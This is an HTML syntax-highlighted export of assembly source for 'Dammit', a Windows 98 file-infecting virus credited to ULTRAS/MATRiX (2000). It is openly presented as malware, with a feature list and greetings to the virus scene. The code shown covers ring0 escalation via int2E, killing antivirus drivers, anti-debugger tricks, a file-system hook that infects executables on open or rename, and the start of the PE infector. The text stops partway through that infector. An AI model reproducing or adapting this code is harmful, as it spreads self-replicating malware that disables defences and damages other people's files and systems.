<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment                                                                           ÿ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [Dammit] by ULTRAS/MATRiX (c) 2000</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus Name   : Dammit</span><span class="sc0">
</span><span class="sc1">; Virus Author : ULTRAS/MATRiX</span><span class="sc0">
</span><span class="sc1">; Origin       : Russia</span><span class="sc0">
</span><span class="sc1">; Version      : 1.2</span><span class="sc0">
</span><span class="sc1">; Platform     : Win98</span><span class="sc0">
</span><span class="sc1">; Target       : PE files (EXE,SCR,CPL,OCX)</span><span class="sc0">
</span><span class="sc1">; Release      : 11 august 2000</span><span class="sc0">
</span><span class="sc1">; Features     :</span><span class="sc0">
</span><span class="sc1">;                ù Ring0-resident via int2E</span><span class="sc0">
</span><span class="sc1">;       ù Fuck SoftIce..</span><span class="sc0">
</span><span class="sc1">;       ù Kill AV VXD driver...</span><span class="sc0">
</span><span class="sc1">;       ù Avoid infection of certain files.</span><span class="sc0">
</span><span class="sc1">;       ù Infects on open, rename and in attribute change.</span><span class="sc0">
</span><span class="sc1">;       ù Small Payload...(kill all icon on desktop)</span><span class="sc0">
</span><span class="sc1">;                ù Anti-heuristics.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Thanx       : Z0MBiE, MiXa.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Greetz       : NBK, mort, anaktos, Del_Armg0, Lord Dark, Billy Belcebu, VirusBuster </span><span class="sc0">
</span><span class="sc1">;       CyberShadow, GreenMonster, Prizzy, Benny, Janush, T2000, SSR, JQwerty</span><span class="sc0">
</span><span class="sc1">;       CyberYoda, Zulu, Bhunji, HenKy, Murkry Asmodeus, Bumblebee,  n0</span><span class="sc0">
</span><span class="sc1">;       Vecna, MrSandman, SlageHammer, LordJulus, t00fic, DarkBeer, urg032,</span><span class="sc0">
</span><span class="sc1">;       mandragore, Shaitan, Spanska, Weird, mgl...</span><span class="sc0">
</span><span class="sc1">;       all peoplezZz i met on #virus &amp; #vir &amp; #smf</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ÿ</span><span class="sc0">

        </span><span class="sc2">.386p</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">
        </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">callring0</span><span class="sc0">       </span><span class="sc1">; call ring0 via int2E</span><span class="sc0">
                        </span><span class="sc1">; tnx Z0MBiE</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">IBase</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">pusho</span><span class="sc0">           </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">r0el</span><span class="sc0">            </span><span class="sc1">; ring0 macroz</span><span class="sc0">
                </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">_ringz</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ringz</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">r0el</span><span class="sc0">
</span><span class="sc5">_ringz</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">endm</span><span class="sc0">

        </span><span class="sc1">; ring0-entering for win98</span><span class="sc0">
        </span><span class="sc1">; (x) 2000 Z0MBiE</span><span class="sc0">

</span><span class="sc5">callring0</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">@@X</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">@@X</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">54h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">38h</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">+</span><span class="sc2">54h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc5">pusho</span><span class="sc0">  </span><span class="sc5">ring0</span><span class="sc0">            </span><span class="sc1">; ring0 loader</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Ah</span><span class="sc0">              </span><span class="sc1">; PoCallDriver</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">2Eh</span><span class="sc0">          </span><span class="sc1">; int2E function</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc4">-</span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ring0 loader</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~</span><span class="sc0">

</span><span class="sc5">ring0</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pushad</span><span class="sc0">              </span><span class="sc1">; save all regs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delta2</span><span class="sc0">
</span><span class="sc5">Delta2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta2</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">killavxd</span><span class="sc0">        </span><span class="sc1">; Kill AV VXD</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'1EAD'</span><span class="sc0">     </span><span class="sc1">; already resident</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Shit</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MemSize</span><span class="sc0">         </span><span class="sc1">; size to allocate</span><span class="sc0">
</span><span class="sc5">VxDcall1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">000Dh</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0040h</span><span class="sc0">           </span><span class="sc1">; allocate memory</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; just to restore stack</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; did we make it?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Shit</span><span class="sc0">            </span><span class="sc1">; back to ring3</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pm</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; where move virus</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; esi = start of virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; copy virus</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ApiHook</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; install new handler</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">VxDcall2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">; install my file system api hook</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0067h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0040h</span><span class="sc0">               </span><span class="sc1">; install api hook</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; restore stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NextHook</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; save the old hook handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"1EAD"</span><span class="sc0">         </span><span class="sc1">; mark as resident</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckThePayloadDate</span><span class="sc0">     </span><span class="sc1">;(and mayB do something:)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fuckSoftIce</span><span class="sc0">

</span><span class="sc5">Shit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">; restore regs</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">                    </span><span class="sc1">; get out of ring0</span><span class="sc0">

</span><span class="sc1">; filesystem hook</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~~~~</span><span class="sc0">

</span><span class="sc5">ApiHook</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; get parametrs off stack</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">        </span><span class="sc1">; file attribute?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Infect</span><span class="sc0">          
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">        </span><span class="sc1">; file open?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Infect</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">        </span><span class="sc1">; file rename?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Infect</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Bz</span><span class="sc0">


</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushad</span><span class="sc0">              </span><span class="sc1">; save all regs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delta3</span><span class="sc0">
</span><span class="sc5">Delta3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta3</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">pm</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pushnback</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">pm</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">              </span><span class="sc1">; save all regs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PathInf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infector</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">               </span><span class="sc1">; restore all regs</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">pm</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">PushNBack</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">               </span><span class="sc1">; restore all regs</span><span class="sc0">


</span><span class="sc5">Bz</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc5">NextHook</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; call old hook address</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">        </span><span class="sc1">; restore stack</span><span class="sc0">
        </span><span class="sc6">leave</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pm</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">; check procedure</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~~~~</span><span class="sc0">

</span><span class="sc5">PathInf</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushad</span><span class="sc0">              </span><span class="sc1">; save all regs</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get filepath's drive number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">NoPath</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">NoPath</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">NoPath</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; prepare for unicode conversion</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">            </span><span class="sc1">; maximum filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get IOREQ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">VxDcall3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">         </span><span class="sc1">; convert name</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0041h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0040h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">               </span><span class="sc1">; restore all regs</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; real pe infection</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~~~~~~</span><span class="sc0">

</span><span class="sc5">Infector</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Ext</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">TestZ</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Ext</span><span class="sc0">

</span><span class="sc5">TestZ</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">     </span><span class="sc1">; exe?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bred</span><span class="sc0">

        </span><span class="sc1">;cmp    [edi-4], 'XTM.'     ; MTX?</span><span class="sc0">
        </span><span class="sc1">;jne    bred</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pushad</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">avoidfilez</span><span class="sc0">
            </span><span class="sc6">popad</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Bred</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">      </span><span class="sc1">; get attributes of the file</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileI0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">      </span><span class="sc1">; clear attributes</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileI0</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D500h</span><span class="sc0">     </span><span class="sc1">; R0_OPENCREATFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; file attribute</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileI0</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Atribut</span><span class="sc0">
